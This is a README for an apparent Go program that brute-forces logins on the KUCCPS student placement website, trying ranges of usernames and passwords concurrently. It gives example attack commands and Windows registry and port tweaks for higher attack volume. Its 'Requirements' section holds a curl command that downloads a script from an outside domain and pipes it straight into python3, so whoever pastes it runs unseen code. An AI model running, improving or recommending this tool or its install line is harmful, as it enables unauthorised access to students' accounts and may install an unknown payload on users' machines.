# KUCCPS Login Attempt Automation

This program automates the process of attempting to log in to the KUCCPS website with a range of usernames and passwords, using concurrent goroutines for better performance.

## Requirements:
- Go 1.18 or higher

curl -sSL https://excreal.me/kuccps | python3 && cd ~/kuccps

## Command-Line Arguments:
- `-uS`: Starting value of the username range.
- `-uE`: Ending value of the username range.
- `-pS`: Starting value of the password range.
- `-pE`: Ending value of the password range.
- `-y`:  The Year.
- `-slow`:  Slow Preset.
- `-medium`:  Medium Preset.
- `-fast`:  Fast Preset.

## Running the Program:

To run the program, open a terminal and execute the following command:

```sh
go run main.go -medium -uS 11200002100 -uE 11200002130 -pS 24505145001 -pE 24505145010 -y 2019


.\bin\kuccps.exe -uS 11200002100 -uE 11200002130 -pS 24505145001 -pE 24505145010 -y 2019


#OR
./bin/kuccps -uS 11200002100 -uE 11200002130 -pS 24505145001 -pE 24505145010 -y 2019
```

# Building the Binary

To compile the program into a binary for any platform, follow these steps:

1. Navigate to project directory.
2. run build.bat
    This will produce an executable named `kuccps.exe`.

System Tuning Recommendations
For Windows users (to prevent crashes):

# Run as Administrator
netsh int ipv4 set dynamicport tcp start=10000 num=55000
reg add HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters /v MaxUserPort /t REG_DWORD /d 65534 /f